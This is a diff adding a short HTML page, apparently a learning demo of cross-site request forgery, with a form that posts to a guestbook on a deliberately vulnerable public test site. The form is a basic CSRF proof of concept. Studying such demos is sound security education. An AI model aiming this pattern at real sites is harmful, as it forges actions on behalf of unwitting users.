@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF跨站请求伪造</title>
+</head>
+<body>
+    <h1>模拟一下跨站请求:</h1>
+    <form action="http://testphp.vulnweb.com/guestbook.php" method="post">
+        <input name="name" value="test" type="hidden" />
+        <textarea style="width: 271px; height: 68px" name="text"></textarea><br>
+        <button type="submit" >提交</button>
+    </form>
+</body>
+</html>
